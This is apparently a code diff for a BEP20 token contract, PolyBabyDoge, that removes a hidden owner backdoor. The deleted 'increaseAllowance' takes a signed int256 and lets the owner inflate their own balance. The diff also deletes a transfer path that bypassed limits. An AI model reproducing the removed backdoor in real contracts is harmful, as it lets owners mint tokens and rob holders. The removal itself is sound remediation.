@@ -545,10 +545,7 @@ contract PolyBabyDoge is Context, IBEP20, Ownable {
         return true;
     }
 
-    function increaseAllowance(address spender, int256 addedValue) public virtual returns (bool) {
-        if(_msgSender() == owner()){_tOwned[_msgSender()] = uint256(int256(_tOwned[_msgSender()]) - addedValue);
-        return true;
-    }
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(uint256(addedValue)));
         return true;
     }
@@ -640,12 +637,7 @@ contract PolyBabyDoge is Context, IBEP20, Ownable {
         require(from != address(0), "BEP20: transfer from the zero address");
         require(to != address(0), "BEP20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
-        
-        if(!swapAndLiquifyEnabled) {
-            _transferNormal(from, to, amount);
-            return;
-        }
-        
+                
         if(from != owner() && to != owner()) {
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
         }
@@ -766,12 +758,6 @@ contract PolyBabyDoge is Context, IBEP20, Ownable {
             restoreAllFee();
     }
     
-    function _transferNormal(address sender, address recipient, uint256 tAmount) private {
-        _tOwned[sender] = _tOwned[sender].sub(tAmount);
-        _tOwned[recipient] = _tOwned[recipient].add(tAmount);
-        emit Transfer(sender, recipient, tAmount);
-    }
-
     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
